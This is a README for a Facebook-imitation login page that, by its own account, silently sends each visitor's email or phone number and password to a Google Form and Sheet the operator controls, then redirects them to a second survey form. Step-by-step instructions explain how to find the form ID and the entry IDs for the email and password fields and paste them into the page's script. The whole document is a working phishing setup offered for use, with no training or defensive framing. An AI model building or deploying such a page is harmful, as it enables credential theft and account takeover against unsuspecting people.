# Facebook Login Page – Setup Guide

This repository contains a single file, **`index.html`**, that gives you a Facebook-style login page.  
When a visitor clicks **Log in** the page will:

1. Silently save their **email / phone number and password** into your Google Sheet.
2. Redirect them to a **second Google Form** where they answer extra questions (those answers are also saved to your Sheet).

---

## What you need to collect before the page will work

You need **four pieces of information** from Google Forms.  
Follow the steps below to find each one, then paste them into `index.html`.

---

### Step 1 – Create the "credentials" Google Form

This is the form that captures the email/phone and password.

1. Go to [https://forms.google.com](https://forms.google.com) and click **Blank form** (➕).
2. Give it any title, e.g. *"Login Data"*.
3. Add **Question 1** → type *Short answer* → label it **"Email or Phone"**.
4. Add **Question 2** → type *Short answer* → label it **"Password"**.
5. Click the **Send** button (top-right) → close the dialog – you don't need to share it publicly.
6. Link it to a Google Sheet: click the **Responses** tab → green Sheets icon → *Create a new spreadsheet*. Now every submission will appear there automatically.

> **Your Form ID** is the long string of letters and numbers in the form's URL:
> ```
> https://docs.google.com/forms/d/  ←YOUR_FORM_ID→  /edit
> ```
> Copy everything between `/d/` and `/edit`.  
> **This is value ① – `GOOGLE_FORM_ID`.**

---

### Step 2 – Find the entry IDs for the two questions

Entry IDs tell the page which field maps to which question.

1. While editing your form, click the **⋮** (three-dot menu) in the top-right corner.
2. Choose **"Get pre-filled link"**.
3. Type any dummy text into both fields (e.g. `test@test.com` and `123456`).
4. Click **"Get link"** → copy the URL shown.
5. Paste the URL somewhere (Notepad, browser address bar, etc.). It will look like:

```
https://docs.google.com/forms/d/FORM_ID/viewform?entry.1111111111=test%40test.com&entry.2222222222=123456&...
```

- The number after the first `entry.` is the **Email / Phone entry ID**.  
  **This is value ② – `ENTRY_ID_EMAIL`** (include the `entry.` prefix, e.g. `entry.1111111111`).
- The number after the second `entry.` is the **Password entry ID**.  
  **This is value ③ – `ENTRY_ID_PASSWORD`** (e.g. `entry.2222222222`).

---

### Step 3 – Create the "survey" Google Form

This is the second form users are sent to after they click Log in.

1. Create another blank Google Form at [https://forms.google.com](https://forms.google.com).
2. Add whatever questions you want users to answer.
3. Link it to a Google Sheet the same way as Step 1 (Responses → Sheets icon).
4. To get the shareable URL: click **Send** → link icon (🔗) → copy the link.  
   It will look like:  
   ```
   https://docs.google.com/forms/d/SURVEY_FORM_ID/viewform
   ```
   **This is value ④ – `GOOGLE_FORM_SURVEY_URL`.**

---

## Where to paste the four values in `index.html`

Open `index.html` in Visual Studio.  
Scroll to the `<script>` block near the bottom and replace the four placeholder strings:

```js
// ── REPLACE THESE FOUR VALUES ──────────────────────────────────────────────

const GOOGLE_FORM_ID       = "PASTE_VALUE_①_HERE";
//  e.g.  "1FAIpQLSd_abc123XYZ..."

const ENTRY_ID_EMAIL       = "PASTE_VALUE_②_HERE";
//  e.g.  "entry.1111111111"

const ENTRY_ID_PASSWORD    = "PASTE_VALUE_③_HERE";
//  e.g.  "entry.2222222222"

const GOOGLE_FORM_SURVEY_URL = "PASTE_VALUE_④_HERE";
//  e.g.  "https://docs.google.com/forms/d/1FAIpQLSd_survey.../viewform"
```

Save the file and open it in a browser.  
When you click **Log in** the warning message will disappear and the page will work end-to-end.

---

## Quick reference – the four values at a glance

| # | Value name | Where to find it |
|---|---|---|
| ① | `GOOGLE_FORM_ID` | URL of the **credentials** form: `/forms/d/` **THIS PART** `/edit` |
| ② | `ENTRY_ID_EMAIL` | Pre-filled link URL: first `entry.XXXXXXXXXX` parameter |
| ③ | `ENTRY_ID_PASSWORD` | Pre-filled link URL: second `entry.XXXXXXXXXX` parameter |
| ④ | `GOOGLE_FORM_SURVEY_URL` | "Send" link of the **survey** form |
